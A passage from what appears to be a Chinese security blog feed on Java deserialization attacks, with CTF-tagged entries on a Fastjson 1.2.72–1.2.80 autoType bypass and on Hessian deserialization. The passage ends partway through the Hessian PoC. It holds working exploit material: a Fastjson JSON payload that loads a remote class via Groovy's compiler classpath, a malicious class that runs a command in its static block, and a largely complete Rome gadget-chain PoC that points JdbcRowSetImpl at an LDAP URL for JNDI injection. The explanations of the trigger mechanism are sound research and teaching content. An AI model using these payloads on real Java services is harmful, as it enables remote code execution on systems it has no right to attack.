href="#1-2-72-lt-Fastjson-lt-x3D-1-2-80" class="headerlink" title="1.2.72 &lt; Fastjson &lt;&#x3D; 1.2.80"></a><strong>1.2.72 &lt; Fastjson &lt;&#x3D; 1.2.80</strong></h2><p>FastJSON1.2.80与1.2.68相比，ParserConfig#checkAutoType()添加了期望类黑名单，期望类在黑名单 中则无法加载，若期望类及目标类不在黑名单中则可使用与1.2.68类似绕过方法绕过检测。</p><p>依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.codehaus.groovy<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>groovy<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.13<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-number">1.</span>利用隐式类关系将 org.codehaus.groovy.control.org.codehaus.groovy.control.ProcessingUnit、 org.codehaus.groovy.control.CompilerConfiguration加入到maping中 <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Exception&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.codehaus.groovy.control.CompilationFailedException&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;unit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-number">2.</span>利用链加载远程类 <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.codehaus.groovy.control.ProcessingUnit&quot;</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit&quot;</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;config&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.codehaus.groovy.control.CompilerConfiguration&quot;</span><span class="hljs-punctuation">,</span><br>           <span class="hljs-attr">&quot;classpath&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;url地址xxx&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>服务器配置:<br> 新建文件 META-INF&#x2F;services&#x2F;org.codehaus.groovy.transform.ASTTransformation 文件内容为MyExction<br> http根目录放置MyExction.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> org.codehaus.groovy.ast.ASTNode;<br><span class="hljs-keyword">import</span> org.codehaus.groovy.control.SourceUnit;<br><span class="hljs-keyword">import</span> org.codehaus.groovy.transform.ASTTransformation;<br><span class="hljs-keyword">import</span> org.codehaus.groovy.transform.GroovyASTTransformation;<br><span class="hljs-meta">@GroovyASTTransformation</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyExction</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ASTTransformation</span> &#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">visit</span><span class="hljs-params">(ASTNode[] astNodes, SourceUnit sourceUnit)</span> &#123;<br>&#125;<br><span class="hljs-keyword">static</span> &#123; <span class="hljs-keyword">try</span> &#123;<br>    Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>&#125; <span class="hljs-keyword">catch</span> (IOException var1) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(var1);<br>&#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> java </tag>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hessian反序列化</title>
      <link href="/2023/01/30/Hessian%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/01/30/Hessian%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="Hessian-反序列化"><a href="#Hessian-反序列化" class="headerlink" title="Hessian 反序列化"></a>Hessian 反序列化</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h3><p>Remote Procedure Call Protocol，远程过程调用协议，和 RMI（Remote Method Invocation，远程方法调用）类似，都能通过网络调用远程服务，但 RPC 是以标准的二进制格式来定义请求的信息，可用实现跨语言和跨操作系统通讯。</p><p>通讯过程：</p><p>1.客户端发起请求，并按照 RPC 协议格式填充信息<br>2.填充完毕后将二进制格式文件转化为流，通过传输协议进行传输<br>3.服务端接收到流后，将其转换为二进制格式文件，并按照 RPC 协议格式获取请求信息并进行处理<br>4.处理完毕后将结果按照 RPC 协议格式写入二进制格式文件中并返回</p><p>maven 添加扩展：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.caucho<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>hessian<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.63<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="Hessian反序列化与原生反序列化的区别"><a href="#Hessian反序列化与原生反序列化的区别" class="headerlink" title="Hessian反序列化与原生反序列化的区别"></a>Hessian反序列化与原生反序列化的区别</h3><p>示例类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Code</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> String name=<span class="hljs-string">&quot;ttt&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age=<span class="hljs-number">222</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span>&#123;<br>        System.out.print(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>原生序列化反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(ser);<br>        oser.writeObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Code</span>());<br>        oser.close();<br><br>        System.out.println(ser);<br>        ObjectInputStream unser=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(ser.toByteArray()));<br>        Object newobj=unser.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236138.png" alt="image-20230126221405110"></p><p>Hessian序列化反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianInput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianOutput;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">hessianDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        HessianOutput hessianOutput=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(ser);<br>        hessianOutput.writeObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Code</span>());<br>        hessianOutput.close();<br><br>        System.out.println(ser);<br><br>        HessianInput hessianInput=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(ser.toByteArray()));<br>        hessianInput.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072235712.png" alt="image-20230126222015375"></p><blockquote><p>从运行结果中可以看出，<code>Hessian</code>反序列化不会自动调用反序列化类的<code>readObject</code>方法，这也就直接导致JDK原生反序列化的大多数<code>gadget</code>在<code>Hessian</code>反序列化中是不能用的。</p><p>还有一个很重要的区别，<code>hessian</code>反序列化中序列化的类不需要实现序列化接口。</p></blockquote><h3 id="Hessian反序列化漏洞"><a href="#Hessian反序列化漏洞" class="headerlink" title="Hessian反序列化漏洞"></a>Hessian反序列化漏洞</h3><p>虽然<code>Hessian</code>反序列化不会自动调用反序列化类的<code>readObject</code>方法，但其也有自己的特性，当其反序列化<code>Map</code>类型的对象的时候，会自动调用其<code>put</code>方法，写个demo试试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">testMap</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HashMap</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">put</span><span class="hljs-params">(Object key, Object value)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.put(key, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianInput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianOutput;<br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">hessianDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        testMap tt=<span class="hljs-keyword">new</span> <span class="hljs-title class_">testMap</span>();<br>        tt.put(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>);<br>        ByteArrayOutputStream ser=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">HessianOutput</span> <span class="hljs-variable">hessianOutput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(ser);<br>        hessianOutput.writeObject(tt);<br>        System.out.println(ser);<br>        <span class="hljs-type">HessianInput</span> <span class="hljs-variable">hessianInput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(ser.toByteArray()));<br>        hessianInput.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072235097.png" alt="image-20230126224841023"></p><p>可以看到确实调用了<code>put</code>方法，这时看到<code>HashMap</code>的<code>put</code>方法</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236935.png" alt="image-20230130233718255"></p><p>对<code>key</code>调用<code>hash</code>方法进行处理</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236365.png" alt="image-20230126225301457"></p><p>只要<code>key</code>不为空，就会调用其<code>hashCode</code>方法，思路一下就打开了，之前看过的利用链中有部分就用到了<code>hashCode</code>方法，比如<code>rome</code>，又比如cc6等。</p><p>就如原生JDK有<code>ysoserial</code>，<code>Hessian</code>也有对应的工具生成<code>paylaod</code>。<a href="https://github.com/mbechler/marshalsec">marshalsec</a>中就集成了<code>Hessian</code>反序列化的<code>gadget</code>，可以使用其生成<code>paylaod</code>，该工具中集成了5个<code>gadget</code></p><ul><li>Rome</li><li>XBean</li><li>Resin</li><li>SpringPartiallyComparableAdvisorHolder</li><li>SpringPartiallyComparableAdvisorHolder</li></ul><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="触发点"><a href="#触发点" class="headerlink" title="触发点"></a>触发点</h3><p>由于 Hessian 会加你个序列化的结果处理成一个 Map，所有序列化的结果的 bytes 的第一个 byte 总为 M（77）,会进入这个case</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;M&#x27;</span>: &#123;<br>      <span class="hljs-type">String</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> readType();<br><br>      <span class="hljs-keyword">return</span> _serializerFactory.readMap(<span class="hljs-built_in">this</span>, type);<br>    &#125;<br></code></pre></td></tr></table></figure><p>跟进readMap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">readMap</span><span class="hljs-params">(AbstractHessianInput in, String type)</span><br>    <span class="hljs-keyword">throws</span> HessianProtocolException, IOException<br>  &#123;<br>    <span class="hljs-type">Deserializer</span> <span class="hljs-variable">deserializer</span> <span class="hljs-operator">=</span> getDeserializer(type);<br></code></pre></td></tr></table></figure><p>跟进getDeserializer，创建一个 HashMap 作为缓存，先将要反序列化的类作为 key 放入 HashMap 中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Deserializer <span class="hljs-title function_">getDeserializer</span><span class="hljs-params">(String type)</span><br>  <span class="hljs-keyword">throws</span> HessianProtocolException<br>&#123;<br>  <span class="hljs-comment">//...</span><br><span class="hljs-keyword">if</span> (deserializer != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (_cachedTypeDeserializerMap == <span class="hljs-literal">null</span>)<br>      _cachedTypeDeserializerMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(<span class="hljs-number">8</span>);<br><br>    <span class="hljs-keyword">synchronized</span> (_cachedTypeDeserializerMap) &#123;<br>      _cachedTypeDeserializerMap.put(type, deserializer);<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> deserializer;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里会调用 HashMap.put 方法，结合之前分析过的 CC 链，后续调用的 hash 函数能触发任意类的 hashcode 方法。那么只需要找一条入口为 hashcode 的反序列化链即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Rome<br>XBean<br>Resin<br>SpringPartiallyComparableAdvisorHolder<br>SpringAbstractBeanFactoryPointcutAdvisor<br></code></pre></td></tr></table></figure><h2 id="打Rome"><a href="#打Rome" class="headerlink" title="打Rome"></a>打Rome</h2><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> moonflower.hessian;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianInput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianOutput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.ObjectNameDeserializer;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.lang.reflect.Array;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hessian_Rome</span> &#123;<br><span class="hljs-comment">//包装序列化的函数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; <span class="hljs-type">byte</span>[] serialize(T o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bao</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">HessianOutput</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(bao);<br>        output.writeObject(o);<br>        System.out.println(bao.toString());<br>        <span class="hljs-keyword">return</span> bao.toByteArray();<br>    &#125;<br>    <span class="hljs-comment">//包装反序列化的函数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bai</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">HessianInput</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(bai);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> input.readObject();<br>        <span class="hljs-keyword">return</span> (T) o;<br>    &#125;<br><span class="hljs-comment">//反射设置value</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><span class="hljs-comment">//反射获取value</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">(Object obj, String name)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> field.get(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">JdbcRowSetImpl</span> <span class="hljs-variable">jdbcRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcRowSetImpl</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ldap://localhost:9999/EXP&quot;</span>;<br>        jdbcRowSet.setDataSourceName(url);<br><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(JdbcRowSetImpl.class,jdbcRowSet);<br>        <span class="hljs-type">EqualsBean</span> <span class="hljs-variable">equalsBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ToStringBean.class,toStringBean);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> makeMap(equalsBean, <span class="hljs-string">&quot;1&quot;</span>);<br><br>        <span class="hljs-type">byte</span>[] s = serialize(hashMap);<br>        System.out.println(s);<br>        System.out.println((HashMap)deserialize(s));<br>    &#125;<br><br>    <span class="hljs-comment">// 用反射动态创建数组，防止在狗仔 gadget 的时候触发 put 方法导致 RCE。</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap&lt;Object, Object&gt; <span class="hljs-title function_">makeMap</span> <span class="hljs-params">(Object v1, Object v2)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        setValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        